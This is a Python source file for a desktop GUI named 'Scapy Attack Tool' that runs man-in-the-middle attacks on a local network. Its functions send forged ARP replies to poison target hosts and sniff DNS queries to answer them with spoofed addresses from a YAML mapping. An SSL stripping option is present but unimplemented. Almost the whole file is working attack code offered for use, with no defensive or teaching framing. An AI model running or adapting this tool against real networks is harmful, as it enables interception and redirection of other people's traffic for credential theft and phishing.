import sys
import threading
import yaml
import time
import os
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QComboBox, QPushButton, QTableWidget, QTableWidgetItem,
    QCheckBox, QTextEdit, QRadioButton, QButtonGroup, QToolBar, QLineEdit,
    QFileDialog, QMessageBox
)
from PySide6.QtGui import QAction
from PySide6.QtCore import QUrl
from PySide6.QtGui import QDesktopServices
from scapy.all import ARP, send, sniff, DNS, DNSQR, DNSRR, IP, UDP

class MainWindow(QMainWindow):
    """
    Main application window for the Scapy Attack Tool.
    Provides UI for ARP poisoning, DNS spoofing, SSL stripping, and PDF-based Help.
    """
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Scapy Attack Tool")
        self.resize(900, 600)

        # State flags and data
        self.running = False
        self.paused = False
        self.pause_event = threading.Event()
        self.stop_event = threading.Event()
        self.mapping_file = None
        self.dns_mapping = {}

        # Toolbar setup
        toolbar = QToolBar()
        self.addToolBar(toolbar)
        toolbar.addWidget(QLabel("Interface:"))
        self.interface_combo = QComboBox()
        toolbar.addWidget(self.interface_combo)
        toolbar.addSeparator()

        dns_map_action = QAction("Load DNS Mapping…", self)
        dns_map_action.triggered.connect(self.load_mapping_file)
        toolbar.addAction(dns_map_action)

        self.mapping_path = QLineEdit(self)
        self.mapping_path.setReadOnly(True)
        self.mapping_path.setPlaceholderText("No DNS mapping loaded")
        toolbar.addWidget(self.mapping_path)
        toolbar.addSeparator()

        help_action = QAction("Help", self)
        help_action.triggered.connect(self.show_help)
        toolbar.addAction(help_action)
        toolbar.addSeparator()

        quit_action = QAction("Quit", self)
        quit_action.triggered.connect(self.close)
        toolbar.addAction(quit_action)

        # Main layout
        central = QWidget()
        main_layout = QVBoxLayout(central)
        self.setCentralWidget(central)
        mid_layout = QHBoxLayout()
        main_layout.addLayout(mid_layout)

        # Targets table for ARP spoofing
        target_layout = QVBoxLayout()
        target_layout.addWidget(QLabel("Targets (IP / Mask / Spoof IP):"))
        self.target_table = QTableWidget(0, 3)
        self.target_table.setHorizontalHeaderLabels(["IP", "Mask", "Spoof IP"])
        target_layout.addWidget(self.target_table)
        add_row_btn = QPushButton("+ Add row")
        add_row_btn.clicked.connect(self.add_target_row)
        target_layout.addWidget(add_row_btn)
        mid_layout.addLayout(target_layout, 2)

        # Modes selection
        mode_layout = QVBoxLayout()
        mode_layout.setContentsMargins(20, 0, 20, 0)
        mode_layout.addWidget(QLabel("Modes:"))
        self.arp_checkbox = QCheckBox("ARP Poisoning")
        self.dns_checkbox = QCheckBox("DNS Spoofing")
        self.ssl_checkbox = QCheckBox("SSL Stripping")
        mode_layout.addWidget(self.arp_checkbox)
        mode_layout.addWidget(self.dns_checkbox)
        mode_layout.addWidget(self.ssl_checkbox)
        mid_layout.addLayout(mode_layout, 1)

        # Logs view
        log_layout = QVBoxLayout()
        log_layout.addWidget(QLabel("Logs:"))
        self.log_edit = QTextEdit()
        self.log_edit.setReadOnly(True)
        log_layout.addWidget(self.log_edit)
        mid_layout.addLayout(log_layout, 3)

        # Bottom controls
        bottom_layout = QHBoxLayout()
        self.silent_radio = QRadioButton("Silent")
        self.allout_radio = QRadioButton("All-Out")
        radio_group = QButtonGroup(self)
        radio_group.addButton(self.silent_radio)
        radio_group.addButton(self.allout_radio)
        bottom_layout.addWidget(self.silent_radio)
        bottom_layout.addWidget(self.allout_radio)
        bottom_layout.addStretch()
        self.start_btn = QPushButton("Start")
        self.start_btn.clicked.connect(self.toggle_attack)
        self.pause_btn = QPushButton("Pause")
        self.pause_btn.clicked.connect(self.toggle_pause)
        self.stop_btn = QPushButton("Stop")
        self.stop_btn.clicked.connect(self.stop_attack)
        bottom_layout.addWidget(self.start_btn)
        bottom_layout.addWidget(self.pause_btn)
        bottom_layout.addWidget(self.stop_btn)
        main_layout.addLayout(bottom_layout)

        # Load interfaces
        self.load_interfaces()

    def show_help(self):
        """
        Open a bundled PDF help file using the system default viewer.
        """
        # Assume help.pdf is in the same directory as this script
        app_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        pdf_path = os.path.join(app_dir, 'help.pdf')
        if not os.path.exists(pdf_path):
            QMessageBox.critical(self, "Help File Missing", f"Could not find {pdf_path}")
            return
        QDesktopServices.openUrl(QUrl.fromLocalFile(pdf_path))

    def load_interfaces(self):
        # Ideally, dynamic detection: scapy.get_if_list()
        self.interface_combo.addItems(["eth0", "wlan0"])

    def load_mapping_file(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select DNS mapping YAML", "", "YAML Files (*.yml *.yaml)")
        if not path:
            return
        try:
            with open(path) as f:
                mapping = yaml.safe_load(f)
            if not isinstance(mapping, dict):
                raise ValueError("YAML must be a dict of name->IP")
            self.dns_mapping = mapping
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load mapping:\n{e}")
            return
        self.mapping_file = path
        self.mapping_path.setText(path)
        self.log(f"Loaded DNS mapping: {len(self.dns_mapping)} entries")

    def add_target_row(self):
        row = self.target_table.rowCount()
        self.target_table.insertRow(row)
        for col in range(3):
            self.target_table.setItem(row, col, QTableWidgetItem(""))

    def get_targets(self):
        targets = []
        for row in range(self.target_table.rowCount()):
            ip_item = self.target_table.item(row, 0)
            spoof_item = self.target_table.item(row, 2)
            if ip_item and spoof_item:
                ip = ip_item.text()
                mask = self.target_table.item(row, 1).text() or '32'
                spoof = spoof_item.text()
                targets.append((ip, mask, spoof))
        return targets

    def toggle_attack(self):
        if not self.running:
            self.start_attack()
        else:
            self.stop_attack()

    def start_attack(self):
        self.running = True
        self.stop_event.clear()
        self.log("[+] Starting attack...")
        iface = self.interface_combo.currentText()
        targets = self.get_targets()
        if self.arp_checkbox.isChecked():
            self.log(f"[*] ARP poisoning on {iface}")
            threading.Thread(
                target=self.arp_poison_loop,
                args=(iface, targets),
                daemon=True
            ).start()
        if self.dns_checkbox.isChecked():
            self.log(f"[*] DNS spoofing on {iface}")
            threading.Thread(
                target=lambda: sniff(
                    filter="udp port 53", iface=iface, prn=self.handle_dns, store=0),
                daemon=True
            ).start()
        if self.ssl_checkbox.isChecked():
            self.log("[*] SSL stripping not implemented")

    def arp_poison_loop(self, iface, targets):
        while self.running and not self.stop_event.is_set():
            if self.pause_event.is_set():
                time.sleep(0.1)
                continue
            for ip, mask, spoof in targets:
                arp_resp = ARP(op=2, pdst=ip, psrc=spoof)
                send(arp_resp, iface=iface, verbose=0)
                self.log(f"ARP reply sent: {spoof} is-at [our MAC] → {ip}")
            time.sleep(2)

    def handle_dns(self, pkt):
        if self.pause_event.is_set() or not pkt.haslayer(DNSQR):
            return
        qname = pkt[DNSQR].qname.decode().rstrip('.')
        client = pkt[IP].src
        if qname in self.dns_mapping:
            spoof_ip = self.dns_mapping[qname]
            resp = IP(dst=client, src=pkt[IP].dst) / UDP(
                dport=pkt[UDP].sport, sport=53) / DNS(
                id=pkt[DNS].id, qr=1, aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=spoof_ip)
            )
            send(resp, verbose=0)
            self.log(f"DNS spoofed: {qname} → {spoof_ip} for {client}")

    def toggle_pause(self):
        if not self.paused:
            self.paused = True
            self.pause_event.set()
            self.pause_btn.setText("Resume")
            self.log("[!] Paused")
        else:
            self.paused = False
            self.pause_event.clear()
            self.pause_btn.setText("Pause")
            self.log("[+] Resumed")

    def stop_attack(self):
        self.running = False
        self.stop_event.set()
        self.log("[-] Stopped")

    def log(self, message):
        timestamp = time.strftime("%H:%M:%S")
        self.log_edit.append(f"[{timestamp}] {message}")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())